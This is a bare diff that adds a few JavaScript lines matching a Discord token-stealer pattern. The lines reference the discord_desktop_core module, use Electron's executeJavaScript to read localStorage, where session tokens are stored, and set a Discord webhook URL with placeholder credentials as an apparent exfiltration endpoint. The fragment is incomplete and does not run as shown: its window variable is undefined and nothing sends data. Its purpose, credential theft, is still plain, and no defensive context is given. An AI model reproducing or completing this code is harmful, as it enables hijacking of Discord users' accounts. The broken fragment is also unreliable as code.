@@ -1,0 +1,5 @@
+const core = "discord_desktop_core";
+const { BrowserWindow } = require('electron');
+win.webContents.executeJavaScript(`localStorage`);
+const hook = "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+
